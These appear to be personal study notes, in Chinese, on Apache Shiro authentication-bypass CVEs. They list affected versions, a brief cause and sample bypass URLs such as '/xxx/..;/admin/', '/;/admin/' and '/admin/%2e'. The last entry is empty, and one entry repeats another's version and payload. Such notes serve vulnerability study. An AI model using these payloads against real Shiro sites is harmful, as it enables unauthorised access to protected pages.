# Learn

Shiro
 - CVE-2010-3863:
   Shiro < 1.1.0
   JSecurity 0.9.X
   在getPathWithinApplication中调用getRequestUri方法获取Uri,没有对路径进行标准化处理,导致可以绕过权限认证。

   [users]
   zhang=123,admin
   wang=123,admin,vip
   每一行定义一个用户, 格式是 username = password, role1, role2, ..., roleN
    ​
    [roles]
    admin=user:delete
    角色在这里定义, 格式是 roleName = perm1, perm2, ..., permN
    说明1: 权限名可以使用带有层次的命名方式, 使用冒号来分割层次关系, 比如 user:create 或 user:poweruser:update 权限.
    //说明2: user:* 这样的权限, 代表具有 user:create 和 user:poweruser:update 权限.
    ​
   [urls]
   /static/**=anon
   /login=anon
   /authc/admin/user/delete=perms["user:delete"]
   /authc/admin/user/create=perms["user:create"]
   /authc/admin/**=roles[admin]
   /authc/home=roles[admin,vip]
   /authc/**=authc
   
   绕过：
    http://127.0.0.1//authc/admin
    http://127.0.0.1/./authc/admin
    http://127.0.0.1/xxx/../authc/admin

 - CVE-2016-6802:
   Shiro < 1.3.2
   getContextPath方法中未标准化路径，该漏洞允许攻击者通过利用非根 Servlet 上下文路径，绕过预期的 Servlet 过滤器，从而获取访问权限。
   http://127.0.0.1/xxxx/../admin/index.jsp

 - CVE-2020-1957:
   Shiro < 1.5.2
   spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问
   chainDefinition.addPathDefinition("/logout", "logout");
   chainDefinition.addPathDefinition("/admin/**", "authc");
   http://127.0.0.1/admin/
   http://127.0.0.1/xxx/..;/admin/

 - CVE-2020-13933:
   Shiro < 1.6.0
   Apache Shiro 1.5.3之前的版本，将Apache Shiro与Spring控制器一起使用时，特制请求可能会导致身份验证绕过
   http://127.0.0.1/;/admin/
   http://127.0.0.1/admin/xx
 - CVE-2020-17510:
   Shiro < 1.7.0
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%2e
 - CVE-2020-17523:
   Shiro < 1.7.1
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%20
 - CVE-2021-41303:
   Shiro < 1.7.1
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%20
 - CVE-2022-32532
   Shiro < 1.9.1
   
